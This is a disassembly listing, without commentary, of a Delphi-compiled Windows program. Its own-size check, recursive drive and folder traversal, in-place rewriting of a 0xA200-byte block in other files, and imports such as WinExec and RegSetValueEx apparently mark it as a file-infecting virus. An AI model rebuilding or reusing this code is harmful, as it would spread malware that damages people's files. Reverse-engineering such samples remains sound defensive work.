                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6ED0        proc near               ; CODE XREF: sub_6FD4+88↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    407BC7h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                call    sub_5080
                mov     [ebp+var_8], eax
                xor     eax, eax
                push    ebp
                push    407B9Dh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_C]
                call    sub_4390
                lea     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_10]
                mov     edx, 4091A8h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_10]
                pop     eax
                call    sub_2614
                mov     edx, [ebp+var_C]
                mov     eax, [ebp+var_8]
                call    sub_5204
                mov     eax, [ebp+var_8]
                mov     edx, [ebp+var_4]
                call    sub_5184
                inc     eax
                jnz     short loc_6F55
                mov     eax, [ebp+var_8]
                mov     edx, [ebp+var_4]
                call    sub_50AC

loc_6F55:                               ; CODE XREF: sub_6ED0+78↑j
                lea     eax, [ebp+var_14]
                call    sub_4390
                lea     eax, [ebp+var_14]
                push    eax
                lea     eax, [ebp+var_18]
                mov     edx, 4091A8h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_18]
                pop     eax
                call    sub_2614
                mov     edx, [ebp+var_14]
                mov     eax, [ebp+var_8]
                call    sub_5250
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407BA4h

loc_6F94:                               ; CODE XREF: CODE:00006FA2↓j
                mov     eax, [ebp+var_8]
                call    sub_3920
                retn
sub_6ED0        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6F94
; ---------------------------------------------------------------------------
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407BCEh

loc_6FB1:                               ; CODE XREF: CODE:00006FCC↓j
                lea     eax, [ebp-18h]
                mov     edx, 4
                call    sub_24B8
                lea     eax, [ebp-4]
                call    sub_2494
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6FB1
; ---------------------------------------------------------------------------
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6FD4        proc near               ; CODE XREF: sub_719C+3B↓p
                                        ; sub_719C+83↓p

var_A214        = dword ptr -0A214h
var_A210        = byte ptr -0A210h
var_9D3E        = byte ptr -9D3Eh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                push    eax
                mov     eax, 0Ah

loc_6FDD:                               ; CODE XREF: sub_6FD4+11↓j
                add     esp, 0FFFFF004h
                push    eax
                dec     eax
                jnz     short loc_6FDD
                mov     eax, [ebp-4]
                add     esp, 0FFFFFDF0h
                push    ebx
                xor     edx, edx
                mov     [ebp+var_A214], edx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    407D8Dh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_A214]
                mov     edx, 4091C0h
                mov     ecx, 3
                call    sub_25F4
                mov     edx, [ebp+var_A214]
                mov     eax, [ebp+var_4]
                call    sub_63E4
                test    al, al
                jz      loc_716C
                mov     eax, [ebp+var_4]
                mov     al, [eax]
                call    sub_198C
                add     al, 0BFh
                sub     al, 2
                jb      loc_716C
                sub     al, 19h
                jz      loc_716C
                mov     eax, [ebp+var_4]
                call    sub_6ED0
                mov     eax, [ebp+var_4]
                call    sub_6530
                test    al, al
                jz      loc_716C
                mov     eax, [ebp+var_4]
                call    sub_280C
                mov     ebx, eax
                push    ebx
                call    sub_3470
                mov     [ebp+var_8], eax
                test    [ebp+var_8], 1
                jbe     short loc_7095
                push    0
                push    ebx
                call    sub_34D8

loc_7095:                               ; CODE XREF: sub_6FD4+B7↑j
                mov     eax, [ebp+var_4]
                call    sub_4F84
                mov     [ebp+var_C], eax
                xor     eax, eax
                push    ebp
                push    407D4Ah
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, [ebp+var_C]
                call    sub_4D7C
                mov     edx, eax
                sub     edx, 0A200h
                mov     eax, [ebp+var_C]
                call    sub_4D74
                lea     edx, [ebp+var_A210]
                mov     eax, [ebp+var_C]
                mov     ecx, 0A200h
                call    sub_4D88
                lea     edx, [ebp+var_10]
                lea     eax, [ebp+var_9D3E]
                mov     ecx, 4
                call    sub_194C
                lea     eax, [ebp+var_A210]
                mov     ecx, [ebp+var_10]
                mov     edx, 3E8h
                call    sub_6480
                mov     eax, [ebp+var_C]
                xor     edx, edx
                call    sub_4D74
                lea     edx, [ebp+var_A210]
                mov     eax, [ebp+var_C]
                mov     ecx, 0A200h
                call    sub_4D8C
                mov     eax, [ebp+var_C]
                call    sub_4D7C
                mov     edx, eax
                sub     edx, 0A200h
                mov     eax, [ebp+var_C]
                call    sub_4D80
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407D51h

loc_7141:                               ; CODE XREF: sub_6FD4+17B↓j
                mov     eax, [ebp+var_C]
                call    sub_3920
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_7141
; ---------------------------------------------------------------------------
                test    [ebp+var_8], 1
                jbe     short loc_716C
                mov     eax, [ebp+var_8]
                push    eax
                mov     eax, [ebp+var_4]
                call    sub_280C
                push    eax
                call    sub_34D8

loc_716C:                               ; CODE XREF: sub_6FD4+63↑j
                                        ; sub_6FD4+77↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407D94h

loc_7179:                               ; CODE XREF: CODE:00007192↓j
                lea     eax, [ebp+var_A214]
                call    sub_2494
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_6FD4        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_7179
; ---------------------------------------------------------------------------
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_719C        proc near               ; CODE XREF: CODE:000075F6↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                push    esi
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    407E75h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, [ebp+var_4]
                cmp     byte ptr [eax], 5Ch ; '\'
                jnz     short loc_71D4
                mov     eax, [ebp+var_4]
                call    sub_65D0
                jmp     short loc_71DC
; ---------------------------------------------------------------------------

loc_71D4:                               ; CODE XREF: sub_719C+2C↑j
                mov     eax, [ebp+var_4]
                call    sub_6FD4

loc_71DC:                               ; CODE XREF: sub_719C+36↑j
                call    sub_3EE8
                mov     esi, eax
                test    esi, esi
                jle     short loc_7228
                mov     ebx, 1

loc_71EC:                               ; CODE XREF: sub_719C+8A↓j
                lea     edx, [ebp+var_8]
                mov     eax, ebx
                call    sub_3DD0
                mov     eax, [ebp+var_8]
                cmp     byte ptr [eax], 5Ch ; '\'
                jnz     short loc_7212
                lea     edx, [ebp+var_C]
                mov     eax, ebx
                call    sub_3DD0
                mov     eax, [ebp+var_C]
                call    sub_65D0
                jmp     short loc_7224
; ---------------------------------------------------------------------------

loc_7212:                               ; CODE XREF: sub_719C+60↑j
                lea     edx, [ebp+var_10]
                mov     eax, ebx
                call    sub_3DD0
                mov     eax, [ebp+var_10]
                call    sub_6FD4

loc_7224:                               ; CODE XREF: sub_719C+74↑j
                inc     ebx
                dec     esi
                jnz     short loc_71EC

loc_7228:                               ; CODE XREF: sub_719C+49↑j
                push    1
                push    [ebp+var_4]
                push    407E8Ch
                lea     edx, [ebp+var_18]
                xor     eax, eax
                call    sub_6334
                push    [ebp+var_18]
                lea     eax, [ebp+var_14]
                mov     edx, 3
                call    sub_26CC
                mov     eax, [ebp+var_14]
                call    sub_280C
                push    eax
                call    sub_34E8
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407E7Ch

loc_7267:                               ; CODE XREF: CODE:0000727A↓j
                lea     eax, [ebp+var_18]
                mov     edx, 6
                call    sub_24B8
                retn
sub_719C        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_7267
; ---------------------------------------------------------------------------
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                dd 0FFFFFFFFh, 1, 20h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_7290        proc near               ; CODE XREF: CODE:loc_7597↓p

var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                mov     ecx, 5

loc_7298:                               ; CODE XREF: sub_7290+D↓j
                push    0
                push    0
                dec     ecx
                jnz     short loc_7298
                push    ebx
                xor     eax, eax
                push    ebp
                push    408020h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_8]
                call    sub_4390
                lea     eax, [ebp+var_8]
                push    eax
                lea     eax, [ebp+var_C]
                mov     edx, 4091A8h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_C]
                pop     eax
                call    sub_2614
                mov     eax, [ebp+var_8]
                call    sub_3F9C
                test    al, al
                jz      loc_7405
                call    sub_5080
                mov     [ebp+var_4], eax
                xor     eax, eax
                push    ebp
                push    407FFEh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_10]
                call    sub_4390
                lea     eax, [ebp+var_10]
                push    eax
                lea     eax, [ebp+var_14]
                mov     edx, 4091A8h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_14]
                pop     eax
                call    sub_2614
                mov     edx, [ebp+var_10]
                mov     eax, [ebp+var_4]
                call    sub_5204
                xor     ebx, ebx
                jmp     short loc_7357
; ---------------------------------------------------------------------------

loc_7331:                               ; CODE XREF: sub_7290+CD↓j
                lea     ecx, [ebp+var_18]
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_5118
                mov     eax, [ebp+var_18]
                call    sub_3F9C
                test    al, al
                jnz     short loc_7356
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_50EC
                jmp     short loc_7357
; ---------------------------------------------------------------------------

loc_7356:                               ; CODE XREF: sub_7290+B8↑j
                inc     ebx

loc_7357:                               ; CODE XREF: sub_7290+9F↑j
                                        ; sub_7290+C4↑j
                mov     eax, [ebp+var_4]
                cmp     ebx, [eax+1Ch]
                jl      short loc_7331
                xor     ebx, ebx
                jmp     short loc_73AE
; ---------------------------------------------------------------------------

loc_7363:                               ; CODE XREF: sub_7290+124↓j
                lea     ecx, [ebp+var_1C]
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_5118
                mov     eax, [ebp+var_1C]
                call    sub_65D0
                test    al, al
                jz      short loc_73A4
                lea     ecx, [ebp+var_20]
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_5118
                mov     eax, [ebp+var_20]
                call    sub_6530
                test    al, al
                jz      short loc_73A1
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_50EC
                jmp     short loc_73AE
; ---------------------------------------------------------------------------

loc_73A1:                               ; CODE XREF: sub_7290+103↑j
                inc     ebx
                jmp     short loc_73AE
; ---------------------------------------------------------------------------

loc_73A4:                               ; CODE XREF: sub_7290+EA↑j
                mov     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_50EC

loc_73AE:                               ; CODE XREF: sub_7290+D1↑j
                                        ; sub_7290+10F↑j ...
                mov     eax, [ebp+var_4]
                cmp     ebx, [eax+1Ch]
                jl      short loc_7363
                lea     eax, [ebp+var_24]
                call    sub_4390
                lea     eax, [ebp+var_24]
                push    eax
                lea     eax, [ebp+var_28]
                mov     edx, 4091A8h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_28]
                pop     eax
                call    sub_2614
                mov     edx, [ebp+var_24]
                mov     eax, [ebp+var_4]
                call    sub_5250
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    408005h

loc_73F5:                               ; CODE XREF: sub_7290+173↓j
                mov     eax, [ebp+var_4]
                call    sub_3920
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_73F5
; ---------------------------------------------------------------------------

loc_7405:                               ; CODE XREF: sub_7290+4F↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    408027h

loc_7412:                               ; CODE XREF: CODE:00007425↓j
                lea     eax, [ebp+var_28]
                mov     edx, 9
                call    sub_24B8
                retn
sub_7290        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_7412
; ---------------------------------------------------------------------------
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    40804Bh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    408052h

loc_744A:                               ; CODE XREF: CODE:00007450↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_744A
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                dd 11h, 40805Ch, 403F88h, 403F58h, 403D7Ch, 403D28h, 403FC0h
                dd 403F90h, 4041D0h, 4041A0h, 404208h, 4041D8h, 404240h
                dd 404210h, 4042C0h, 404290h, 4043A0h, 404370h, 404368h
                dd 404338h, 404330h, 404300h, 404288h, 404258h, 4042F8h
                dd 4042C8h, 4043D8h, 4043A8h, 404410h, 4043E0h, 406D38h
                dd 406CE0h, 4070D4h, 4070A4h, 0
                dd 40802Ch
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFE0h
                xor     eax, eax
                mov     [ebp-20h], eax
                mov     [ebp-18h], eax
                mov     [ebp-1Ch], eax
                mov     [ebp-14h], eax
                mov     eax, 408054h
                call    sub_3314
                xor     eax, eax
                push    ebp
                push    408220h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, 4091A8h
                mov     ecx, 0Bh
                mov     edx, 0Bh
                call    sub_6480
                mov     eax, 4091B4h
                mov     ecx, 9
                mov     edx, 9
                call    sub_6480
                mov     eax, 4091C0h
                mov     ecx, 3
                mov     edx, 3
                call    sub_6480
                mov     eax, 4091DCh
                mov     ecx, 3
                mov     edx, 3
                call    sub_6480
                mov     eax, ds:409210h
                mov     ecx, 0Bh
                mov     edx, 0Bh
                call    sub_6480
                call    sub_64DC
                lea     edx, [ebp-14h]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp-14h]
                call    sub_436C
                cmp     eax, 0A200h
                jle     short loc_7597
                call    sub_6A78

loc_7597:                               ; CODE XREF: CODE:00007590↑j
                call    sub_7290
                mov     eax, 4091C4h
                mov     ecx, 3
                mov     edx, 3
                call    sub_6480
                call    sub_3EE8
                test    eax, eax
                jz      short loc_75FB
                lea     edx, [ebp-18h]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp-18h]
                push    eax
                lea     eax, [ebp-1Ch]
                mov     edx, 4091C4h
                mov     ecx, 3
                call    sub_25F4
                mov     edx, [ebp-1Ch]
                pop     eax
                call    sub_63E4
                test    al, al
                jz      short loc_75FB
                lea     edx, [ebp-20h]
                mov     eax, 1
                call    sub_3DD0
                mov     eax, [ebp-20h]
                call    sub_719C

loc_75FB:                               ; CODE XREF: CODE:000075B7↑j
                                        ; CODE:000075E4↑j
                call    sub_6DA0
                call    sub_699C
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    408227h

loc_7612:                               ; CODE XREF: CODE:00007625↓j
                lea     eax, [ebp-20h]
                mov     edx, 4
                call    sub_24B8
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_7612
; ---------------------------------------------------------------------------
                call    sub_23A4
; ---------------------------------------------------------------------------
                dd 78h dup(0)
                dd 408D02h, 2 dup(0)
                dd 0C08B1332h, 3 dup(408D00h), 2 dup(0)
                dd 401E74h, 402004h, 402384h, 0C8CCCB00h, 0C8CFD7C9h, 0D8DBCECDh
                dd 0DCCAD9DAh, 0E0DFDEDDh, 0E400E3E1h, 408DE5h, 6F727245h
                dd 0C08B0072h
aRuntimeErrorAt db 'Runtime error     at 00000000',0
                align 10h
                dd 33323130h, 37363534h, 42413938h, 46454443h, 0FFFFFFFFh
                dd 6 dup(0)
                dd 408D3Dh, 408D05h, 1C001Fh, 2 dup(1E001Fh), 1F001Fh
                dd 2 dup(1F001Eh), 1D001Fh, 2 dup(1E001Fh), 1F001Fh, 2 dup(1F001Eh)
                dd 0
                dd 4046B4h, 404ECCh, 404F14h, 4059D8h, 4059E4h, 4059F8h
                dd 2 dup(4059FCh), 405A18h, 2 dup(0)
                dd 405A24h, 405A4Ch, 405A50h, 405A90h, 405AB4h, 405AE0h
                dd 2 dup(0)
                dd 8040100h, 20181010h, 408D00h, 0F800h, 7E0h, 1Fh, 0
                dd 800000h, 8000h, 808000h, 80h, 800080h, 8080h, 808080h
                dd 0C0C0C0h, 0FF0000h, 0FF00h, 0FFFF00h, 0FFh, 0FF00FFh
                dd 0FFFFh, 8040100h, 20181010h, 408D00h, 10080401h, 90002018h
                dd 0CDED452Ch, 57A4FB98h, 9016C980h, 9DEF413Ch, 57EFBDCBh
                dd 9015DD87h, 0E7D64A7Bh, 3EDE4AF6h, 408D85h, 9084FC7Dh
                dd 908CEB7Bh, 0FEC4EAEDh, 3241CC47h, 89CFF15h, 82DB4E18h
                dd 0D0A5F581h, 90CBAA32h, 90FE5E2Bh, 57E3BAC7h, 900BCB97h
                dd 6ED9E1B5h, 0FD5812CAh, 9A2E15B1h, 0F34EDB74h, 93749EC4h
                dd 0EE68E2EEh, 0C08B8411h, 0F2B28860h, 0FD35F854h, 40919Ch
                dd 409008h, 7Dh dup(0)
                dd 15258h, 150DCh, 3 dup(0)
                dd 153E0h, 15134h, 3 dup(0)
                dd 1540Ch, 15140h, 3 dup(0)
                dd offset byte_1544C, offset loc_15150, 3 dup(0)
                dd 15480h, 1515Ch, 3 dup(0)
                db 0CCh
                db 54h, 1, 0
                dd 15170h, 3 dup(0)
                dd 1550Ah, 15180h, 3 dup(0)
                dd 156F6h, 151F4h, 3 dup(0)
                dd 157C4h, 15228h, 3 dup(0)
                dd 15838h, 1524Ch, 5 dup(0)
                dd 15266h, 1527Eh, 15296h, 152AEh, 152CAh, 152D8h, 152E8h
                dd 152F4h, 15302h, 15310h, 15326h, 15338h, 1534Ah, 1535Ch
                dd 1536Eh, 1537Ch, 1538Ah, 15396h, 153B2h, 153BEh, 153D0h
                dd 0
                dd 153ECh, 153FEh, 0
                dd 1541Ah, 1542Eh, 1543Eh, 0
                dd 1545Ah, 1546Ah, 0
                dd 1548Eh, 1549Ch, 154AAh, 154B8h, 0
                dd 154DAh, 154ECh, 154FCh, 0
                dd 15518h, 15524h, 1552Eh, 15540h, 15556h, 15566h, 1557Eh
                dd 1558Eh, 1559Ah, 155B2h, 155C2h, 155D6h, 155ECh, 15606h
                dd 15616h, 15626h, 15634h, 1564Ah, 1565Ah, 1566Ch, 1567Ah
                dd 1568Ah, 1569Ch, 156A8h, 156B6h, 156C6h, 156D4h, 156E8h
                dd 0
                dd 15700h, 15710h, 1571Ch, 1572Ch, 1573Ah, 15746h, 15756h
                dd 15762h, 15776h, 1578Ah, 157A0h, 157BAh, 0
                dd 157D0h, 157DCh, 157EAh, 157F8h, 15800h, 1580Ch, 1581Ah
                dd 15826h, 0
                dd 15844h, 15854h, 0
aKernel32Dll    db 'kernel32.dll',0
                align 4
aDeletecritical db 'DeleteCriticalSection',0
                align 10h
aLeavecriticals db 'LeaveCriticalSection',0
                align 4
aEntercriticals db 'EnterCriticalSection',0
                align 10h
aInitializecrit db 'InitializeCriticalSection',0
                align 4
aVirtualfree    db 'VirtualFree',0
                dd 69560000h, 61757472h, 6C6C416Ch, 636Fh, 6F4C0000h, 466C6163h
                dd 656572h, 6F4C0000h, 416C6163h, 636F6C6Ch, 0
aGetversion     db 'GetVersion',0
                align 10h
                db    0
                align 2
aGetcurrentthre db 'GetCurrentThreadId',0
                align 4
aGetthreadlocal db 'GetThreadLocale',0
                dd 65470000h, 61745374h, 70757472h, 6F666E49h, 41h, 4C746547h
                dd 6C61636Fh, 666E4965h, 416Fh, 65470000h, 6D6F4374h, 646E616Dh
                dd 656E694Ch, 41h, 65657246h, 7262694Ch, 797261h, 78450000h
                dd 72507469h, 7365636Fh, 73h, 74697257h, 6C694665h, 65h
aUnhandledexcep db 'UnhandledExceptionFilter',0
                align 4
aRtlunwind      db 'RtlUnwind',0
                align 10h
aRaiseexception db 'RaiseException',0
                align 10h
                dd 65470000h, 64745374h, 646E6148h, 656Ch, 72657375h, 642E3233h
                dd 6C6Ch, 65470000h, 79654B74h, 72616F62h, 70795464h, 65h
                dd 7373654Dh, 42656761h, 41786Fh, 61766461h, 32336970h
                dd 6C6C642Eh, 0
aRegqueryvaluee db 'RegQueryValueExA',0
                align 10h
aRegopenkeyexa  db 'RegOpenKeyExA',0
                align 10h
aRegclosekey    db 'RegCloseKey',0
aOleaut32Dll    db 'oleaut32.dll',0
                align 4
aSysfreestring  db 'SysFreeString',0
                align 4
aSysreallocstri db 'SysReAllocStringLen',0
aKernel32Dll_0  db 'kernel32.dll',0
                align 10h
aTlssetvalue    db 'TlsSetValue',0
                dd 6C540000h, 74654773h, 756C6156h, 65h, 61636F4Ch, 6C6C416Ch
                dd 636Fh, 65470000h, 646F4D74h, 48656C75h, 6C646E61h, 4165h
                dd 61766461h, 32336970h, 6C6C642Eh, 0
aRegsetvalueexa db 'RegSetValueExA',0
                align 4
                db    0
                align 2
aRegopenkeyexa_0 db 'RegOpenKeyExA',0
                db    0
                align 2
aRegclosekey_0  db 'RegCloseKey',0
aKernel32Dll_1  db 'kernel32.dll',0
                align 4
                db    0
                align 2
aWritefile      db 'WriteFile',0
                db    0
                align 2
aWinexec        db 'WinExec',0
                align 10h
aSetfilepointer db 'SetFilePointer',0
                align 10h
                db    0
                align 2
aSetfileattribu db 'SetFileAttributesA',0
                align 4
aSetendoffile   db 'SetEndOfFile',0
                align 4
aSetcurrentdire db 'SetCurrentDirectoryA',0
                align 10h
aReleasemutex   db 'ReleaseMutex',0
                align 10h
aReadfile       db 'ReadFile',0
                align 4
aGetwindowsdire db 'GetWindowsDirectoryA',0
                align 4
aGettemppatha   db 'GetTempPathA',0
                align 4
aGetshortpathna db 'GetShortPathNameA',0
                align 4
aGetmodulefilen db 'GetModuleFileNameA',0
                align 4
                db    0
                align 2
aGetlogicaldriv db 'GetLogicalDriveStringsA',0
                align 4
aGetlocaltime   db 'GetLocalTime',0
                align 4
aGetlasterror   db 'GetLastError',0
                align 4
aGetfilesize    db 'GetFileSize',0
                db    0
                align 2
aGetfileattribu db 'GetFileAttributesA',0
                align 4
aGetdrivetypea  db 'GetDriveTypeA',0
                align 4
aGetcommandline db 'GetCommandLineA',0
                dd 72460000h, 694C6565h, 72617262h, 79h, 646E6946h, 7478654Eh
                dd 656C6946h, 41h, 646E6946h, 73726946h, 6C694674h, 4165h
                dd 69460000h, 6C43646Eh, 65736Fh, 65440000h, 6574656Ch
                dd 656C6946h, 41h, 61657243h, 754D6574h, 41786574h, 0
aCreatefilea    db 'CreateFileA',0
                dd 72430000h, 65746165h, 65726944h, 726F7463h, 4179h, 6C430000h
                dd 4865736Fh, 6C646E61h, 64670065h, 2E323369h, 6C6C64h
                dd 74530000h, 63746572h, 42494468h, 737469h, 65530000h
                dd 42494474h, 737469h, 65530000h, 7463656Ch, 656A624Fh
                dd 7463h, 65470000h, 6A624F74h, 41746365h, 0
aGetdibits      db 'GetDIBits',0
                align 4
aDeleteobject   db 'DeleteObject',0
                align 4
aDeletedc       db 'DeleteDC',0
                align 4
aCreatesolidbru db 'CreateSolidBrush',0
                align 4
aCreatedibsecti db 'CreateDIBSection',0
                align 4
aCreatecompatib db 'CreateCompatibleDC',0
                align 10h
                db    0
                align 2
aCreatecompatib_0 db 'CreateCompatibleBitmap',0
                align 4
aBitblt         db 'BitBlt',0
                align 4
aUser32Dll      db 'user32.dll',0
                align 10h
                dd 65520000h, 7361656Ch, 434465h, 65470000h, 73795374h
                dd 6F6C6F43h, 72h, 49746547h, 496E6F63h, 6F666Eh, 65470000h
                dd 434474h, 69460000h, 65526C6Ch, 7463h, 65440000h, 6F727473h
                dd 6F634979h, 6Eh, 79706F43h, 67616D49h, 65h, 72616843h
                dd 65776F4Ch, 66754272h, 4166h, 6C656873h, 2E32336Ch, 6C6C64h
                dd 68530000h, 456C6C65h, 75636578h, 416574h, 78450000h
                dd 63617274h, 6F634974h, 416Eh, 67h dup(0)
                dd 416000h, 416008h, 409090h, 417010h, 7Ch dup(0)
                dd 1000h, 120h, 300A3002h, 301A3012h, 302A3022h, 303A3032h
                dd 304A3042h, 305A3052h, 306A3062h, 307A3072h, 308A3082h
                dd 30BE3092h, 30CE30C6h, 30DE30D6h, 30EE30E6h, 30FF30F6h
                dd 31283120h, 31973190h, 335632DFh, 33EB33A5h, 347433FEh
                dd 34F934B8h, 3539352Dh, 35E73554h, 37723736h, 379A378Fh
                dd 37AD37A5h, 37C137B7h, 37E137CBh, 37F537E7h, 38123808h
                dd 38263818h, 3834382Ch, 38523846h, 386D3861h, 38803875h
                dd 38933886h, 38B33899h, 38C438BAh, 38D838CEh, 38EF38E4h
                dd 39063900h, 3918390Eh, 393A392Fh, 3973395Bh, 39AA3992h
                dd 39F239B2h, 3A573A08h, 3A953A77h, 3BCC3BBFh, 3C053BFFh
                dd 3C273C1Eh, 3C3B3C30h, 3C4B3C44h, 3C613C5Ah, 3CDC3C83h
                dd 3D693CE4h, 3D8C3D87h, 3DFE3D92h, 3E143E04h, 3E623E1Dh
                dd 3E813E6Bh, 3EB33EA7h, 3EEE3EBBh, 3F323F18h, 3F653F5Ch
                dd 3F7D3F75h, 3F8C3F83h, 3F983F93h, 3FB13F9Eh, 3FD83FBAh
                dd 3FE63FDEh, 2000h, 110h, 30163010h, 30403028h, 3054304Ch
                dd 307A306Bh, 30AA308Ah, 30E630C2h, 30F430EEh, 312C30FAh
                dd 316E3150h, 3184317Eh, 31F1318Ch, 320531FCh, 321B320Bh
                dd 32753224h, 328C327Ch, 329C3296h, 32AA32A4h, 32B732B0h
                dd 336832C1h, 33AF3391h, 33C333BBh, 3423341Dh, 344F342Bh
                dd 3497346Fh, 34C934B0h, 34EF34DAh, 351C34FCh, 368535D9h
                dd 38023690h, 38513841h, 38853867h, 38B2389Bh, 390138C7h
                dd 392A3916h, 39483932h, 396E3960h, 39BE39A2h, 39DE39CAh
                dd 39FB39E8h, 3A583A2Bh, 3A933A61h, 3AD13A9Ch, 3AFA3AD8h
                dd 3B6F3B47h, 3CDF3CB7h, 3CFE3CE6h, 3D543D20h, 3D673D5Ch
                dd 3DA83D93h, 3E063DF3h, 3E4E3E1Ah, 3E583E52h, 3E613E5Ch
                dd 3E6E3E68h, 3E813E76h, 3E983E90h, 3ECF3EC4h, 3EF63EECh
                dd 3F253F1Bh, 3F373F2Fh, 3F4B3F3Dh, 3F7B3F66h, 3F8A3F85h
                dd 3FAE3FA9h, 3FD53FB3h, 3FE9h
                dd 3000h, 0A0h, 3057304Eh, 308A307Dh, 36363413h, 373A363Fh
                dd 3BA13743h, 3BF23BB2h, 3C0B3BF9h, 3C323C29h, 3C453C3Eh
                dd 3D0D3CC4h, 3D3B3D2Fh, 3D4C3D42h, 3D6D3D56h, 3D8B3D7Eh
                dd 3D963D92h, 3DA03D9Ch, 3DAD3DA6h, 3DCB3DB1h, 3DDD3DD4h
                dd 3DF33DE9h, 3E2F3E1Ah, 3E4A3E40h, 3E5A3E52h, 3E6A3E62h
